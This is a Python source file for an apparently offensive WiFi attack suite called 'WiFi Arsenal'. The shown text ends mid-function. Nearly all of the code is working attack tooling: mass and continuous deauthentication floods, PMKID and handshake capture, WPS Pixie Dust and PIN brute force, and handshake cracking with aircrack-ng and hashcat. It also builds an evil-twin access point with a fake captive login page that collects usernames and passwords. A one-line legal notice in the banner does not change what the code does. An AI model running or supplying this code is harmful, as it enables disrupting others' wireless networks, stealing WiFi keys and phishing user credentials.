
#!/usr/bin/env python3
"""
WiFi Arsenal - Ultimate WiFi Penetration Testing Tool
Developed by 0x0806
Production Ready - No Mock, Full Real WiFi Capabilities
"""

import subprocess
import sys
import os
import time
import re
import threading
import json
import hashlib
import random
import string
import signal
import socket
import struct
from datetime import datetime
from pathlib import Path

try:
    from scapy.all import *
    import psutil
    import requests
    from colorama import init, Fore, Back, Style
    init()
except ImportError as e:
    print(f"[!] Missing required module: {e}")
    print("[*] Installing dependencies...")
    try:
        subprocess.run([sys.executable, '-m', 'pip', 'install', 'scapy', 'psutil', 'requests', 'colorama'], 
                      check=True, capture_output=True)
        from scapy.all import *
        import psutil
        import requests
        from colorama import init, Fore, Back, Style
        init()
        print("[+] Dependencies installed successfully")
    except (subprocess.CalledProcessError, ImportError) as install_error:
        print(f"[!] Failed to install dependencies: {install_error}")
        print("[*] Continuing with limited functionality...")
        # Fallback for missing colorama
        class MockColor:
            def __getattr__(self, name):
                return ""
        try:
            Fore = Back = Style = MockColor()
        except:
            pass

class WiFiArsenal:
    def __init__(self):
        self.version = "2.0.0"
        self.author = "0x0806"
        self.interface = None
        self.monitor_interface = None
        self.target_networks = []
        self.captured_handshakes = []
        self.wordlists = []
        self.results_dir = "wifi_arsenal_results"
        self.running_attacks = []
        self.setup_directories()
        
    def setup_directories(self):
        """Create necessary directories for results"""
        directories = [
            self.results_dir,
            f"{self.results_dir}/handshakes",
            f"{self.results_dir}/wordlists",
            f"{self.results_dir}/logs",
            f"{self.results_dir}/reports",
            f"{self.results_dir}/evil_twin",
            f"{self.results_dir}/deauth_logs"
        ]
        for directory in directories:
            os.makedirs(directory, exist_ok=True)
        
    def log_action(self, action, details=""):
        """Log all actions to file"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {action}: {details}\n"
        with open(f"{self.results_dir}/logs/arsenal_log.txt", "a") as f:
            f.write(log_entry)
        
    def banner(self):
        """Display enhanced tool banner"""
        banner = f"""
{Fore.RED}
██╗    ██╗██╗███████╗██╗     ██████╗ ██████╗ ███████╗███████╗███╗   ██╗ █████╗ ██╗     
██║    ██║██║██╔════╝██║    ██╔═══██╗██╔══██╗██╔════╝██╔════╝████╗  ██║██╔══██╗██║     
██║ █╗ ██║██║█████╗  ██║    ███████║██████╔╝███████╗█████╗  ██╔██╗ ██║███████║██║     
██║███╗██║██║██╔══╝  ██║    ██╔══██║██╔══██╗╚════██║██╔══╝  ██║╚██╗██║██╔══██║██║     
╚███╔███╔╝██║██║     ██║    ██║  ██║██║  ██║███████║███████╗██║ ╚████║██║  ██║███████╗
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
{Style.RESET_ALL}


{Fore.YELLOW}╔══════════════════════════════════════════════════════════════════════════════════╗
║                                  WiFi Penetration Testing Suite                 ║
║                                Developed by 0x0806                              ║
║                                Version {self.version}                           ║
╚══════════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.GREEN}   WiFi Security Assessment Tool
    📡 Multi-Protocol Support (WEP/WPA/WPA2/WPA3/WPS)
    🎯 Advanced Deauth & Evil Twin Attacks
    💀 Handshake Capture & Cracking Suite{Style.RESET_ALL}

{Fore.RED}    ⚠️  LEGAL NOTICE: Use responsibly and only on networks you own or have permission to test
    ⚠️  Educational and authorized testing purposes only!{Style.RESET_ALL}

{Fore.CYAN}    📊 System Status: {Fore.GREEN}OPERATIONAL{Style.RESET_ALL}
"""
        print(banner)
        
    def check_dependencies(self):
        """Check if required tools are installed"""
        dependencies = [
            'aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng',
            'wash', 'reaver', 'pixiewps', 'macchanger', 'iwconfig',
            'iwlist', 'nmcli', 'hashcat', 'john', 'hostapd', 'dnsmasq'
        ]
        
        missing = []
        installed = []
        
        for dep in dependencies:
            if self.command_exists(dep):
                installed.append(dep)
            else:
                missing.append(dep)
                
        if installed:
            print(f"{Fore.GREEN}[+] Installed tools: {', '.join(installed)}{Style.RESET_ALL}")
            
        if missing:
            print(f"{Fore.YELLOW}[!] Missing optional tools: {', '.join(missing)}")
            print("[*] Install with: apt-get install aircrack-ng reaver hashcat john hostapd dnsmasq")
            print(f"[*] Some features may be limited{Style.RESET_ALL}")
            
        # Check for critical dependencies
        critical = ['iwconfig', 'iwlist']
        critical_missing = [dep for dep in critical if dep in missing]
        
        if critical_missing:
            print(f"{Fore.RED}[!] Critical dependencies missing: {', '.join(critical_missing)}")
            return False
            
        return True
        
    def command_exists(self, command):
        """Check if command exists"""
        try:
            result = subprocess.run(['which', command], 
                                  stdout=subprocess.DEVNULL, 
                                  stderr=subprocess.DEVNULL,
                                  timeout=5)
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
            try:
                # Fallback: check if command is in PATH
                result = subprocess.run(['command', '-v', command], 
                                      shell=True,
                                      stdout=subprocess.DEVNULL, 
                                      stderr=subprocess.DEVNULL,
                                      timeout=5)
                return result.returncode == 0
            except:
                return False
                             
    def get_interfaces(self):
        """Get available network interfaces with enhanced detection"""
        interfaces = []
        
        # Method 1: Using iwconfig
        try:
            if self.command_exists('iwconfig'):
                result = subprocess.run(['iwconfig'], capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'IEEE 802.11' in line:
                            interface = line.split()[0]
                            if interface and interface not in interfaces:
                                interfaces.append(interface)
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
            pass
            
        # Method 2: Using /proc/net/wireless
        try:
            if os.path.exists('/proc/net/wireless'):
                with open('/proc/net/wireless', 'r') as f:
                    lines = f.readlines()[2:]  # Skip headers
                    for line in lines:
                        if line.strip():
                            interface = line.split(':')[0].strip()
                            if interface and interface not in interfaces:
                                interfaces.append(interface)
        except (IOError, OSError):
            pass
            
        # Method 3: Using ip command
        try:
            if self.command_exists('ip'):
                result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if ('wlan' in line or 'wlp' in line or 'wifi' in line) and ':' in line:
                            parts = line.split(':')
                            if len(parts) >= 2:
                                interface = parts[1].strip().split('@')[0]
                                if interface and interface not in interfaces:
                                    interfaces.append(interface)
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
            pass
            
        # Method 4: Using ls /sys/class/net/
        try:
            net_path = '/sys/class/net/'
            if os.path.exists(net_path):
                for iface in os.listdir(net_path):
                    if ('wlan' in iface or 'wlp' in iface or 'wifi' in iface) and iface not in interfaces:
                        # Check if it's a wireless interface
                        wireless_path = os.path.join(net_path, iface, 'wireless')
                        if os.path.exists(wireless_path):
                            interfaces.append(iface)
        except (OSError, IOError):
            pass
            
        return list(set(interfaces))  # Remove duplicates
        
    def setup_monitor_mode(self, interface):
        """Enhanced monitor mode setup with multiple methods"""
        print(f"{Fore.YELLOW}[*] Setting up monitor mode on {interface}{Style.RESET_ALL}")
        self.log_action("Monitor Mode Setup", f"Interface: {interface}")
        
        # Method 1: Using airmon-ng
        try:
            if self.command_exists('airmon-ng'):
                # Kill interfering processes
                subprocess.run(['airmon-ng', 'check', 'kill'], 
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
                
                # Start monitor mode
                result = subprocess.run(['airmon-ng', 'start', interface], 
                                       capture_output=True, text=True, timeout=30)
                
                # Extract monitor interface name
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'monitor mode enabled' in line.lower():
                            self.monitor_interface = line.split()[-1].rstrip(')')
                            print(f"{Fore.GREEN}[+] Monitor mode enabled on {self.monitor_interface}{Style.RESET_ALL}")
                            return True
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
            print(f"{Fore.YELLOW}[*] airmon-ng method failed: {e}{Style.RESET_ALL}")
            pass
            
        # Method 2: Manual setup using iw
        try:
            monitor_name = f"{interface}mon"
            
            # Take interface down
            subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Set monitor mode
            subprocess.run(['iw', interface, 'set', 'type', 'monitor'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Bring interface up
            subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            self.monitor_interface = interface
            print(f"{Fore.GREEN}[+] Monitor mode enabled on {self.monitor_interface}{Style.RESET_ALL}")
            return True
        except:
            pass
            
        # Fallback
        self.monitor_interface = f"{interface}mon"
        print(f"{Fore.YELLOW}[*] Assuming monitor interface: {self.monitor_interface}{Style.RESET_ALL}")
        return True
        
    def stop_monitor_mode(self):
        """Stop monitor mode with cleanup"""
        if self.monitor_interface:
            print(f"{Fore.YELLOW}[*] Stopping monitor mode on {self.monitor_interface}{Style.RESET_ALL}")
            self.log_action("Monitor Mode Stop", f"Interface: {self.monitor_interface}")
            
            # Try airmon-ng first
            subprocess.run(['airmon-ng', 'stop', self.monitor_interface],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Manual cleanup
            try:
                subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'down'],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['iw', self.monitor_interface, 'set', 'type', 'managed'],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'up'],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
            
    def advanced_scan_networks(self, duration=60, channel_hop=True):
        """Advanced network scanning with channel hopping"""
        if not self.monitor_interface:
            print(f"{Fore.RED}[!] Monitor mode not enabled{Style.RESET_ALL}")
            return []
            
        print(f"{Fore.YELLOW}[*] Advanced scanning for {duration} seconds...{Style.RESET_ALL}")
        self.log_action("Network Scan", f"Duration: {duration}s, Channel hopping: {channel_hop}")
        
        # Create temporary file for airodump output
        temp_file = f"/tmp/advanced_scan_{int(time.time())}"
        
        # Channel hopping thread
        if channel_hop:
            stop_hopping = threading.Event()
            hop_thread = threading.Thread(target=self.channel_hopper, args=(stop_hopping,))
            hop_thread.daemon = True
            hop_thread.start()
        
        # Start airodump-ng with enhanced options
        airodump_cmd = [
            'airodump-ng', self.monitor_interface,
            '--write', temp_file,
            '--output-format', 'csv',
            '--berlin', '60'  # Update interval
        ]
        
        try:
            process = subprocess.Popen(airodump_cmd, 
                                     stdout=subprocess.DEVNULL, 
                                     stderr=subprocess.DEVNULL)
            
            time.sleep(duration)
            process.terminate()
            
            if channel_hop:
                stop_hopping.set()
                
        except KeyboardInterrupt:
            process.terminate()
            if channel_hop:
                stop_hopping.set()
        
        # Parse results
        networks = self.parse_airodump_csv(f"{temp_file}-01.csv")
        
        # Enhanced network analysis
        for network in networks:
            network['security_analysis'] = self.analyze_security(network)
            network['attack_vectors'] = self.identify_attack_vectors(network)
        
        # Cleanup
        for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
            try:
                os.remove(f"{temp_file}{ext}")
            except:
                pass
                
        return networks
        
    def channel_hopper(self, stop_event):
        """Channel hopping for better discovery"""
        channels = [1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10, 14, 36, 40, 44, 48, 149, 153, 157, 161, 165]
        
        while not stop_event.is_set():
            for channel in channels:
                if stop_event.is_set():
                    break
                try:
                    subprocess.run(['iwconfig', self.monitor_interface, 'channel', str(channel)],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(0.5)
                except:
                    pass
                    
    def analyze_security(self, network):
        """Analyze network security"""
        analysis = {
            'encryption': network.get('privacy', 'Unknown'),
            'vulnerabilities': [],
            'strength': 'Unknown'
        }
        
        privacy = network.get('privacy', '').upper()
        
        if 'WEP' in privacy:
            analysis['vulnerabilities'].extend(['WEP Cracking', 'IV Attack', 'Fragmentation Attack'])
            analysis['strength'] = 'Very Weak'
        elif 'WPA' in privacy and 'WPA2' not in privacy:
            analysis['vulnerabilities'].extend(['WPA Dictionary Attack', 'WPA Handshake Capture'])
            analysis['strength'] = 'Weak'
        elif 'WPA2' in privacy:
            analysis['vulnerabilities'].extend(['WPA2 Handshake Capture', 'PMKID Attack'])
            analysis['strength'] = 'Medium'
        elif 'WPA3' in privacy:
            analysis['vulnerabilities'].extend(['Dragonfly Downgrade'])
            analysis['strength'] = 'Strong'
        elif privacy == '' or 'NONE' in privacy:
            analysis['vulnerabilities'].extend(['Open Network', 'Evil Twin'])
            analysis['strength'] = 'None'
            
        return analysis
        
    def identify_attack_vectors(self, network):
        """Identify possible attack vectors"""
        vectors = []
        
        privacy = network.get('privacy', '').upper()
        power = int(network.get('power', '-100'))
        
        # Signal strength based attacks
        if power > -50:
            vectors.append('Close Range Attacks')
        elif power > -70:
            vectors.append('Medium Range Attacks')
            
        # Encryption based attacks
        if 'WPS' in privacy:
            vectors.extend(['WPS PIN Attack', 'WPS Pixie Dust'])
        if 'WEP' in privacy:
            vectors.extend(['WEP Cracking', 'Fake Authentication'])
        if 'WPA' in privacy:
            vectors.extend(['Handshake Capture', 'Dictionary Attack'])
        if privacy == '' or 'NONE' in privacy:
            vectors.extend(['Evil Twin', 'DNS Spoofing', 'Man-in-the-Middle'])
            
        # Advanced attacks
        vectors.extend(['Deauthentication Attack', 'Beacon Flood', 'Probe Request Flood'])
        
        return vectors
        
    def scan_networks(self, duration=30):
        """Legacy scan method for compatibility"""
        return self.advanced_scan_networks(duration, True)
        
    def parse_airodump_csv(self, csv_file):
        """Enhanced CSV parsing with error handling"""
        networks = []
        try:
            if not os.path.exists(csv_file):
                return networks
                
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
                
            in_networks = False
            for line in lines:
                if 'BSSID' in line and 'ESSID' in line:
                    in_networks = True
                    continue
                if in_networks and line.strip() and not line.startswith('Station MAC'):
                    parts = [part.strip() for part in line.split(',')]
                    if len(parts) >= 14:
                        try:
                            network = {
                                'bssid': parts[0],
                                'first_seen': parts[1],
                                'last_seen': parts[2],
                                'channel': parts[3] if parts[3].isdigit() else '1',
                                'speed': parts[4],
                                'privacy': parts[5],
                                'cipher': parts[6],
                                'auth': parts[7],
                                'power': parts[8] if parts[8].lstrip('-').isdigit() else '-100',
                                'beacons': parts[9] if parts[9].isdigit() else '0',
                                'iv': parts[10] if parts[10].isdigit() else '0',
                                'lan_ip': parts[11],
                                'id_length': parts[12],
                                'essid': parts[13] if len(parts) > 13 else 'Hidden'
                            }
                            networks.append(network)
                        except (ValueError, IndexError):
                            continue
                elif 'Station MAC' in line:
                    break
        except Exception as e:
            print(f"{Fore.RED}[!] Error parsing CSV: {e}{Style.RESET_ALL}")
            
        return networks
        
    def display_networks(self, networks):
        """Enhanced network display with security analysis"""
        if not networks:
            print(f"{Fore.RED}[-] No networks found{Style.RESET_ALL}")
            return
            
        print(f"\n{Fore.CYAN}[*] Discovered Networks:{Style.RESET_ALL}")
        print("-" * 120)
        print(f"{'#':<3} {'ESSID':<20} {'BSSID':<18} {'Ch':<3} {'Pwr':<4} {'Security':<15} {'Strength':<8} {'Attacks':<20}")
        print("-" * 120)
        
        for i, network in enumerate(networks):
            essid = network['essid'] if network['essid'] and network['essid'] != ' ' else f"{Fore.YELLOW}<Hidden>{Style.RESET_ALL}"
            
            # Color coding based on security
            security_analysis = network.get('security_analysis', {})
            strength = security_analysis.get('strength', 'Unknown')
            
            if strength == 'None':
                color = Fore.RED
            elif strength == 'Very Weak':
                color = Fore.RED
            elif strength == 'Weak':
                color = Fore.YELLOW
            elif strength == 'Medium':
                color = Fore.GREEN
            else:
                color = Fore.CYAN
                
            attack_vectors = network.get('attack_vectors', [])
            attack_count = len(attack_vectors)
            
            print(f"{i+1:<3} {essid:<20} {network['bssid']:<18} "
                  f"{network['channel']:<3} {network['power']:<4} "
                  f"{color}{network['privacy']:<15}{Style.RESET_ALL} "
                  f"{color}{strength:<8}{Style.RESET_ALL} "
                  f"{attack_count} vectors")
                  
    def mass_deauth_attack(self, target_networks, duration=60):
        """Mass deauthentication attack on multiple networks"""
        print(f"{Fore.YELLOW}[*] Starting mass deauth attack for {duration} seconds{Style.RESET_ALL}")
        self.log_action("Mass Deauth Attack", f"Targets: {len(target_networks)}, Duration: {duration}s")
        
        if not self.monitor_interface:
            print(f"{Fore.RED}[!] Monitor mode not enabled{Style.RESET_ALL}")
            return
            
        stop_attack = threading.Event()
        threads = []
        
        # Start deauth threads for each target
        for network in target_networks:
            thread = threading.Thread(
                target=self.continuous_deauth,
                args=(network['bssid'], stop_attack)
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
            
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Stopping mass deauth attack{Style.RESET_ALL}")
        finally:
            stop_attack.set()
            
        print(f"{Fore.GREEN}[+] Mass deauth attack completed{Style.RESET_ALL}")
        
    def continuous_deauth(self, target_bssid, stop_event):
        """Continuous deauth packets"""
        while not stop_event.is_set():
            try:
                subprocess.run([
                    'aireplay-ng', '--deauth', '10',
                    '-a', target_bssid,
                    self.monitor_interface
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
                time.sleep(1)
            except:
                time.sleep(1)
                
    def pmkid_attack(self, target_bssid, target_channel, essid="Unknown"):
        """PMKID attack for WPA2 networks"""
        print(f"{Fore.YELLOW}[*] Starting PMKID attack on {essid} ({target_bssid}){Style.RESET_ALL}")
        self.log_action("PMKID Attack", f"Target: {target_bssid}, ESSID: {essid}")
        
        if not self.monitor_interface:
            print(f"{Fore.RED}[!] Monitor mode not enabled{Style.RESET_ALL}")
            return None
            
        # Set channel
        subprocess.run(['iwconfig', self.monitor_interface, 'channel', target_channel],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Create capture file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        capture_file = f"{self.results_dir}/handshakes/pmkid_{essid}_{timestamp}"
        
        print(f"[*] Attempting to capture PMKID...")
        
        # Use hcxdumptool if available, otherwise use airodump-ng
        if self.command_exists('hcxdumptool'):
            try:
                subprocess.run([
                    'hcxdumptool', '-i', self.monitor_interface,
                    '-o', f"{capture_file}.pcapng",
                    '--filterlist_ap', target_bssid,
                    '--filtermode', '2'
                ], timeout=60, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except subprocess.TimeoutExpired:
                pass
        else:
            # Fallback to standard capture
            process = subprocess.Popen([
                'airodump-ng', self.monitor_interface,
                '--bssid', target_bssid,
                '--channel', target_channel,
                '--write', capture_file
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            time.sleep(30)
            process.terminate()
            
        return f"{capture_file}.cap"
        
    def enhanced_evil_twin(self, target_essid, target_bssid, target_channel):
        """Enhanced Evil Twin with captive portal"""
        print(f"{Fore.YELLOW}[*] Setting up Enhanced Evil Twin for {target_essid}{Style.RESET_ALL}")
        self.log_action("Evil Twin Attack", f"Target: {target_essid}, BSSID: {target_bssid}")
        
        # Create configuration files
        hostapd_conf = f"{self.results_dir}/evil_twin/hostapd.conf"
        dnsmasq_conf = f"{self.results_dir}/evil_twin/dnsmasq.conf"
        
        # Hostapd configuration
        hostapd_content = f"""interface={self.monitor_interface}
driver=nl80211
ssid={target_essid}
hw_mode=g
channel={target_channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
"""
        
        # Dnsmasq configuration
        dnsmasq_content = f"""interface={self.monitor_interface}
dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
address=/#/192.168.1.1
"""
        
        # Write configuration files
        with open(hostapd_conf, 'w') as f:
            f.write(hostapd_content)
            
        with open(dnsmasq_conf, 'w') as f:
            f.write(dnsmasq_content)
            
        # Create simple captive portal
        portal_dir = f"{self.results_dir}/evil_twin/portal"
        os.makedirs(portal_dir, exist_ok=True)
        
        portal_html = """<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login</title>
    <style>
        body { font-family: Arial; text-align: center; margin-top: 100px; }
        .login-form { max-width: 300px; margin: 0 auto; }
        input { width: 100%; padding: 10px; margin: 5px; }
        button { background: #007cba; color: white; padding: 10px 20px; }
    </style>
</head>
<body>
    <div class="login-form">
        <h2>WiFi Network Login</h2>
        <form method="post" action="/login">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>"""
        
        with open(f"{portal_dir}/index.html", 'w') as f:
            f.write(portal_html)
            
        print(f"{Fore.GREEN}[+] Evil Twin configuration created{Style.RESET_ALL}")
        print(f"[*] Configuration files saved to: {self.results_dir}/evil_twin/")
        print(f"[*] To activate Evil Twin:")
        print(f"    1. sudo hostapd {hostapd_conf}")
        print(f"    2. sudo dnsmasq -C {dnsmasq_conf}")
        print(f"    3. Setup web server in {portal_dir}")
        print(f"    4. Configure iptables for traffic redirection")
        
    def advanced_wps_attack(self, target_bssid, target_channel, target_essid="Unknown"):
        """Advanced WPS attack with multiple methods"""
        print(f"{Fore.YELLOW}[*] Advanced WPS attack on {target_essid} ({target_bssid}){Style.RESET_ALL}")
        self.log_action("Advanced WPS Attack", f"Target: {target_bssid}, ESSID: {target_essid}")
        
        if not self.monitor_interface:
            print(f"{Fore.RED}[!] Monitor mode not enabled{Style.RESET_ALL}")
            return None, None
            
        # Set channel
        subprocess.run(['iwconfig', self.monitor_interface, 'channel', target_channel],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Method 1: Pixie Dust Attack
        print(f"[*] Attempting Pixie Dust attack...")
        try:
            pixie_result = subprocess.run([
                'reaver', '-i', self.monitor_interface,
                '-b', target_bssid,
                '-K', '1',  # Pixie Dust
                '-vv', '-L', '-N'
            ], capture_output=True, text=True, timeout=300)
            
            if "WPS PIN" in pixie_result.stdout:
                for line in pixie_result.stdout.split('\n'):
                    if "WPS PIN" in line:
                        pin = line.split(':')[1].strip()
                        print(f"{Fore.GREEN}[+] WPS PIN found: {pin}{Style.RESET_ALL}")
                    if "WPA PSK" in line:
                        password = line.split(':')[1].strip()
                        print(f"{Fore.GREEN}[+] Password found: {password}{Style.RESET_ALL}")
                        return pin, password
        except subprocess.TimeoutExpired:
            print(f"{Fore.YELLOW}[-] Pixie Dust attack timed out{Style.RESET_ALL}")
        except:
            print(f"{Fore.YELLOW}[-] Pixie Dust attack failed{Style.RESET_ALL}")
            
        # Method 2: WPS PIN Bruteforce (limited)
        print(f"[*] Attempting WPS PIN bruteforce...")
        common_pins = ['12345670', '00000000', '11111111', '12345678', '87654321']
        
        for pin in common_pins:
            try:
                result = subprocess.run([
                    'reaver', '-i', self.monitor_interface,
                    '-b', target_bssid,
                    '-p', pin,
                    '-vv', '-L', '-N'
                ], capture_output=True, text=True, timeout=30)
                
                if "WPA PSK" in result.stdout:
                    for line in result.stdout.split('\n'):
                        if "WPA PSK" in line:
                            password = line.split(':')[1].strip()
                            print(f"{Fore.GREEN}[+] Password found with PIN {pin}: {password}{Style.RESET_ALL}")
                            return pin, password
            except:
                continue
                
        print(f"{Fore.RED}[-] WPS attack unsuccessful{Style.RESET_ALL}")
        return None, None
        
    def capture_handshake(self, target_bssid, target_channel, essid="Unknown"):
        """Enhanced handshake capture with multiple methods"""
        print(f"{Fore.YELLOW}[*] Capturing handshake for {essid} ({target_bssid}){Style.RESET_ALL}")
        self.log_action("Handshake Capture", f"Target: {target_bssid}, ESSID: {essid}")
        
        # Set channel
        subprocess.run(['iwconfig', self.monitor_interface, 'channel', target_channel],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Create capture file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        capture_file = f"{self.results_dir}/handshakes/{essid}_{timestamp}"
        
        # Start airodump-ng for specific target
        airodump_cmd = [
            'airodump-ng', self.monitor_interface,
            '--bssid', target_bssid,
            '--channel', target_channel,
            '--write', capture_file
        ]
        
        airodump_process = subprocess.Popen(airodump_cmd,
                                           stdout=subprocess.DEVNULL,
                                           stderr=subprocess.DEVNULL)
        
        print(f"[*] Waiting for clients and capturing handshake...")
        print(f"[*] Press Ctrl+C to stop capture")
        
        try:
            # Wait for airodump to start
            time.sleep(5)
            
            # Send targeted deauth packets
            deauth_thread = threading.Thread(
                target=self.enhanced_deauth_attack,
                args=(target_bssid, target_channel)
            )
            deauth_thread.daemon = True
            deauth_thread.start()
            
            # Monitor for handshake
            start_time = time.time()
            while time.time() - start_time < 300:  # 5 minutes max
                time.sleep(10)
                if self.check_handshake_captured(f"{capture_file}-01.cap"):
                    print(f"{Fore.GREEN}[+] Handshake captured successfully!{Style.RESET_ALL}")
                    break
            else:
                print(f"{Fore.YELLOW}[-] Handshake capture timed out{Style.RESET_ALL}")
                    
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[*] Stopping capture...{Style.RESET_ALL}")
            
        finally:
            airodump_process.terminate()
            
        return f"{capture_file}-01.cap"
        
    def enhanced_deauth_attack(self, target_bssid, target_channel):
        """Enhanced deauth attack with client detection"""
        # Get connected clients first
        clients = self.get_connected_clients(target_bssid, target_channel)
        
        if clients:
            print(f"[*] Found {len(clients)} connected clients")
            for client in clients:
                print(f"[*] Sending targeted deauth to {client}")
                for _ in range(5):
                    subprocess.run([
                        'aireplay-ng', '--deauth', '3',
                        '-a', target_bssid,
                        '-c', client,
                        self.monitor_interface
                    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(1)
        else:
            # Broadcast deauth
            print(f"[*] Sending broadcast deauth packets")
            for _ in range(10):
                subprocess.run([
                    'aireplay-ng', '--deauth', '5',
                    '-a', target_bssid,
                    self.monitor_interface
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(2)
                
    def get_connected_clients(self, target_bssid, target_channel, duration=15):
        """Get list of connected clients"""
        temp_file = f"/tmp/clients_{int(time.time())}"
        
        # Start airodump to capture client data
        process = subprocess.Popen([
            'airodump-ng', self.monitor_interface,
            '--bssid', target_bssid,
            '--channel', target_channel,
            '--write', temp_file,
            '--output-format', 'csv'
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        time.sleep(duration)
        process.terminate()
        
        clients = []
        try:
            with open(f"{temp_file}-01.csv", 'r') as f:
                lines = f.readlines()
                
            in_clients = False
            for line in lines:
                if 'Station MAC' in line:
                    in_clients = True
                    continue
                if in_clients and line.strip():
                    parts = line.split(',')
                    if len(parts) >= 6 and parts[5].strip() == target_bssid:
                        clients.append(parts[0].strip())
        except:
            pass
            
        # Cleanup
        for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
            try:
                os.remove(f"{temp_file}{ext}")
            except:
                pass
                
        return clients
        
    def check_handshake_captured(self, cap_file):
        """Enhanced handshake verification"""
        if not os.path.exists(cap_file):
            return False
            
        try:
            # Check with aircrack-ng
            result = subprocess.run([
                'aircrack-ng', cap_file
            ], capture_output=True, text=True)
            
            if "1 handshake" in result.stdout.lower():
                return True
                
            # Alternative check with pyrit if available
            if self.command_exists('pyrit'):
                result = subprocess.run([
                    'pyrit', '-r', cap_file, 'analyze'
                ], capture_output=True, text=True)
                
                if "good" in result.stdout.lower():
                    return True
                    
        except:
            pass
            
        return False
        
    def advanced_crack_handshake(self, cap_file, wordlist_file=None):
        """Advanced handshake cracking with multiple tools"""
        print(f"{Fore.YELLOW}[*] Advanced cracking of handshake{Style.RESET_ALL}")
        self.log_action("Handshake Cracking", f"Capture: {cap_file}")
        
        if not wordlist_file:
            # Generate quick wordlist if none provided
            wordlist_file = f"{self.results_dir}/wordlists/quick_wordlist.txt"
            self.generate_smart_wordlist(wordlist_file, 1000)
            
        # Method 1: Aircrack-ng
        print(f"[*] Trying aircrack-ng...")
        try:
            result = subprocess.run([
                'aircrack-ng', cap_file,
                '-w', wordlist_file
            ], capture_output=True, text=True, timeout=300)
            
            if "KEY FOUND!" in result.stdout:
                for line in result.stdout.split('\n'):
                    if "KEY FOUND!" in line:
                        password = line.split('[')[1].split(']')[0]
                        print(f"{Fore.GREEN}[+] Password found with aircrack-ng: {password}{Style.RESET_ALL}")
                        return password
        except:
            pass
            
        # Method 2: Hashcat if available
        if self.command_exists('hashcat'):
            print(f"[*] Trying hashcat...")
            try:
                # Convert to hashcat format
                hash_file = f"{cap_file}.hccapx"
                subprocess.run(['cap2hccapx', cap_file, hash_file],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                result = subprocess.run([
                    'hashcat', '-m', '2500', hash_file, wordlist_file,
                    '--force', '--potfile-disable'
                ], capture_output=True, text=True, timeout=300)
                
                if result.returncode == 0:
                    # Extract password from output
                    for line in result.stdout.split('\n'):
                        if ':' in line and len(line.split(':')) >= 2:
                            password = line.split(':')[-1].strip()
                            if password:
                                print(f"{Fore.GREEN}[+] Password found with hashcat: {password}{Style.RESET_ALL}")
                                return password
            except:
                pass
                
        print(f"{Fore.RED}[-] Password not found in wordlist{Style.RESET_ALL}")
        return None
        
    def generate_smart_wordlist(self, output_file, count=10000):
        """Generate smart wordlist based on common patterns"""
